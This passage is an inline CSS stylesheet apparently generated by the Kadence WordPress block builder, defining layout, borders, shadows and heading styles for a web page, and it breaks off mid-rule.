.kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_1742f7-37 figure{max-width:150px;}.kb-image76_1742f7-37 img.kb-img, .kb-image76_1742f7-37 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_4ba763-6e > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_4ba763-6e > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_889475-71 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_889475-71 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_889475-71 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_889475-71 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_889475-71 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_889475-71, .kt-inside-inner-col > .kadence-column76_889475-71:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_889475-71 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_889475-71 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_66d7bf-54 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_66d7bf-54 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_66d7bf-54 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_66d7bf-54 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_66d7bf-54 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_66d7bf-54, .kt-inside-inner-col > .kadence-column76_66d7bf-54:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_66d7bf-54 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_66d7bf-54 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db, .wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db[data-kb-block="kb-adv-heading76_6f3ae5-db"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db[data-kb-block="kb-adv-heading76_6f3ae5-db"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db[data-kb-block="kb-adv-heading76_6f3ae5-db"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db, .wp-block-kadence-advancedheading.kt-adv-heading76_6f3ae5-db[data-kb-block="kb-adv-heading76_6f3ae5-db"]{font-size:22px;}}.kb-row-layout-id76_2cfa02-88 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_2cfa02-88 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_db98a1-d7 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_db98a1-d7 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_db98a1-d7 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_db98a1-d7 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_db98a1-d7 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_db98a1-d7, .kt-inside-inner-col > .kadence-column76_db98a1-d7:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_db98a1-d7 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_db98a1-d7 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_9d3a39-4e > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_9d3a39-4e > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_9d3a39-4e > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_9d3a39-4e > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_9d3a39-4e > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_9d3a39-4e, .kt-inside-inner-col > .kadence-column76_9d3a39-4e:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_9d3a39-4e > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_9d3a39-4e > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a, .wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a[data-kb-block="kb-adv-heading76_d0eb0e-3a"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a[data-kb-block="kb-adv-heading76_d0eb0e-3a"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a[data-kb-block="kb-adv-heading76_d0eb0e-3a"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a, .wp-block-kadence-advancedheading.kt-adv-heading76_d0eb0e-3a[data-kb-block="kb-adv-heading76_d0eb0e-3a"]{font-size:22px;}}.kb-row-layout-id76_dcf4e6-81 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_dcf4e6-81 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_fd43d1-56 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_fd43d1-56 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_fd43d1-56 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_fd43d1-56 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_fd43d1-56 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_fd43d1-56, .kt-inside-inner-col > .kadence-column76_fd43d1-56:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_fd43d1-56 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_fd43d1-56 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_a5a6be-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_a5a6be-17 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a5a6be-17 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a5a6be-17 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a5a6be-17 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_a5a6be-17, .kt-inside-inner-col > .kadence-column76_a5a6be-17:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_a5a6be-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a5a6be-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5[data-kb-block="kb-adv-heading76_bfc130-b5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5[data-kb-block="kb-adv-heading76_bfc130-b5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5[data-kb-block="kb-adv-heading76_bfc130-b5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_bfc130-b5[data-kb-block="kb-adv-heading76_bfc130-b5"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_f789bd-05:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_f789bd-05 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_f789bd-05 img.kb-img, .kb-image76_f789bd-05 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_f789bd-05 img.kb-img, .kb-image76_f789bd-05 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_f789bd-05.kb-image-is-ratio-size, .kb-image76_f789bd-05 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_f789bd-05 figure{max-width:150px;}.kb-image76_f789bd-05 img.kb-img, .kb-image76_f789bd-05 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_8206aa-2a > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_8206aa-2a > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_3150b3-84 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_3150b3-84 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_3150b3-84 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_3150b3-84 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_3150b3-84 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_3150b3-84, .kt-inside-inner-col > .kadence-column76_3150b3-84:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_3150b3-84 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_3150b3-84 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_391c99-b5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_391c99-b5 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_391c99-b5 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_391c99-b5 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_391c99-b5 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_391c99-b5, .kt-inside-inner-col > .kadence-column76_391c99-b5:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_391c99-b5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_391c99-b5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac, .wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac[data-kb-block="kb-adv-heading76_ce4ddd-ac"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac[data-kb-block="kb-adv-heading76_ce4ddd-ac"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac[data-kb-block="kb-adv-heading76_ce4ddd-ac"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac, .wp-block-kadence-advancedheading.kt-adv-heading76_ce4ddd-ac[data-kb-block="kb-adv-heading76_ce4ddd-ac"]{font-size:22px;}}.kb-row-layout-id76_a5af26-d2 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a5af26-d2 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_388109-3d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_388109-3d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_388109-3d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_388109-3d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_388109-3d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_388109-3d, .kt-inside-inner-col > .kadence-column76_388109-3d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_388109-3d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_388109-3d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_835b8d-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_835b8d-65 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_835b8d-65 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_835b8d-65 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_835b8d-65 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_835b8d-65, .kt-inside-inner-col > .kadence-column76_835b8d-65:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_835b8d-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_835b8d-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9, .wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9[data-kb-block="kb-adv-heading76_0e27e8-b9"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9[data-kb-block="kb-adv-heading76_0e27e8-b9"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9[data-kb-block="kb-adv-heading76_0e27e8-b9"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9, .wp-block-kadence-advancedheading.kt-adv-heading76_0e27e8-b9[data-kb-block="kb-adv-heading76_0e27e8-b9"]{font-size:22px;}}.kb-row-layout-id76_a5ea02-f3 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a5ea02-f3 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_b8af29-22 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_b8af29-22 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_b8af29-22 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b8af29-22 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b8af29-22 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b8af29-22, .kt-inside-inner-col > .kadence-column76_b8af29-22:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_b8af29-22 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b8af29-22 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_c3cc71-5b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_c3cc71-5b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c3cc71-5b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c3cc71-5b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c3cc71-5b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_c3cc71-5b, .kt-inside-inner-col > .kadence-column76_c3cc71-5b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_c3cc71-5b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c3cc71-5b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20, .wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20[data-kb-block="kb-adv-heading76_4c449c-20"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20[data-kb-block="kb-adv-heading76_4c449c-20"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20[data-kb-block="kb-adv-heading76_4c449c-20"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20, .wp-block-kadence-advancedheading.kt-adv-heading76_4c449c-20[data-kb-block="kb-adv-heading76_4c449c-20"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_7aa214-db:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_7aa214-db .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_7aa214-db img.kb-img, .kb-image76_7aa214-db .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_7aa214-db img.kb-img, .kb-image76_7aa214-db .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_7aa214-db.kb-image-is-ratio-size, .kb-image76_7aa214-db .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_7aa214-db figure{max-width:150px;}.kb-image76_7aa214-db img.kb-img, .kb-image76_7aa214-db .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_14181a-89 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_14181a-89 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_d27b97-7f > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_d27b97-7f > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_d27b97-7f > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d27b97-7f > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d27b97-7f > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d27b97-7f, .kt-inside-inner-col > .kadence-column76_d27b97-7f:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_d27b97-7f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d27b97-7f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_330787-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_330787-ef > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_330787-ef > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_330787-ef > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_330787-ef > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_330787-ef, .kt-inside-inner-col > .kadence-column76_330787-ef:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_330787-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_330787-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99, .wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99[data-kb-block="kb-adv-heading76_57b245-99"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99[data-kb-block="kb-adv-heading76_57b245-99"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99[data-kb-block="kb-adv-heading76_57b245-99"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99, .wp-block-kadence-advancedheading.kt-adv-heading76_57b245-99[data-kb-block="kb-adv-heading76_57b245-99"]{font-size:22px;}}.kb-row-layout-id76_8df8af-ae > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_8df8af-ae > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_276f81-91 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_276f81-91 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_276f81-91 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_276f81-91 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_276f81-91 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_276f81-91, .kt-inside-inner-col > .kadence-column76_276f81-91:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_276f81-91 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_276f81-91 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b05a84-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b05a84-fa > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b05a84-fa > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b05a84-fa > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b05a84-fa > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b05a84-fa, .kt-inside-inner-col > .kadence-column76_b05a84-fa:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b05a84-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b05a84-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1, .wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1[data-kb-block="kb-adv-heading76_676f37-f1"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1[data-kb-block="kb-adv-heading76_676f37-f1"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1[data-kb-block="kb-adv-heading76_676f37-f1"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1, .wp-block-kadence-advancedheading.kt-adv-heading76_676f37-f1[data-kb-block="kb-adv-heading76_676f37-f1"]{font-size:22px;}}.kb-row-layout-id76_abdef2-e9 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_abdef2-e9 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_09c68d-e1 > 